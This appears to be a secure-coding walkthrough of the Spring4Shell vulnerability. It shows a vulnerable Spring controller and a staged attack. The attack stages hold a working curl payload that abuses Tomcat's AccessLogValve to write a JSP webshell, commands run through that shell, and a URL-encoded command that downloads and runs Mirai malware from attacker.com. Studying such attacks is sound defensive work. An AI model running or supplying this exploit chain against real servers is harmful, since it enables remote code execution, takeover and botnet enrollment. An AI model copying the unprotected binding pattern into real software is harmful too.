## Vulnerable Implementation

```java
// VULNERABLE: POJO parameter binding without protection
package com.example.userprofile;

import org.springframework.web.bind.annotation.*;
import org.springframework.http.ResponseEntity;

@RestController
@RequestMapping("/api/profile")
public class UserProfileController {

    @GetMapping("/update")
    public ResponseEntity<?> updateProfile(UserProfile user) {
        // VULNERABLE: Spring automatically binds all query parameters to 'user' object
        // Attacker can send: class.module.classLoader.resources.context...
        // This traverses Spring's object graph to reach restricted objects

        System.out.println("User updated: " + user.getName());
        return ResponseEntity.ok("Profile updated successfully");
    }
}

// VULNERABLE POJO: No protection against property injection
public class UserProfile {
    private String name;
    private String email;
    private String bio;

    // Standard getters/setters
    // VULNERABLE: Spring binds ANY property, including class.* chains
    public String getName() { return name; }
    public void setName(String name) { this.name = name; }

    public String getEmail() { return email; }
    public void setEmail(String email) { this.email = email; }

    public String getBio() { return bio; }
    public void setBio(String bio) { this.bio = bio; }
}
```

### Attack Demonstration: Spring4Shell RCE via AccessLogValve Manipulation

**Stage 1: Reconnaissance**
```bash
# Attacker discovers vulnerable Spring Boot on port 8080
curl http://victim.example.com:8080/api/profile/update?name=test
# Response confirms Spring Boot (visible in error messages or response headers)
```

**Stage 2: Create JSP Webshell via Tomcat AccessLogValve**
```bash
# Craft malicious payload with property traversal chain
# The payload manipulates Tomcat's AccessLogValve to write a JSP file

# Payload breakdown:
# 1. Access ClassLoader via protected bypass: class.module.classLoader
# 2. Navigate to Tomcat resources: .resources.context.parent.pipeline.first
# 3. Set log pattern to contain JSP code: .pattern=<malicious_jsp>
# 4. Set output to webapps/ROOT: .directory=webapps/ROOT
# 5. Set file extension to .jsp: .suffix=.jsp
# 6. Set file prefix: .prefix=shell

curl -X GET 'http://victim.example.com:8080/api/profile/update' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if("pwd123".equals(request.getParameter("p"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("c")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b, "UTF-8")); } } %{suffix}i' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='

# Tomcat processes the request and logs it to: webapps/ROOT/shell.jsp
```

**Stage 3: Remote Code Execution via JSP Webshell**
```bash
# Execute commands through the JSP webshell
curl 'http://victim.example.com:8080/shell.jsp?p=pwd123&c=whoami'
# Response: root

curl 'http://victim.example.com:8080/shell.jsp?p=pwd123&c=id'
# Response: uid=0(root) gid=0(root) groups=0(root)

# Download and execute Mirai malware
curl 'http://victim.example.com:8080/shell.jsp?p=pwd123&c=cd%20/tmp%3B%20wget%20http%3A%2F%2Fattacker.com%2Fmalware.x86%3B%20chmod%20777%20*%3B%20./malware.x86%20mSpring.x86'
```

**Stage 4: Persistence and Lateral Movement**
```bash
# Attacker maintains access, deploys Mirai for botnet enrollment
# Compromised server joins DDoS botnet, generates revenue for attacker
# Lateral movement to internal networks via compromised application server
```

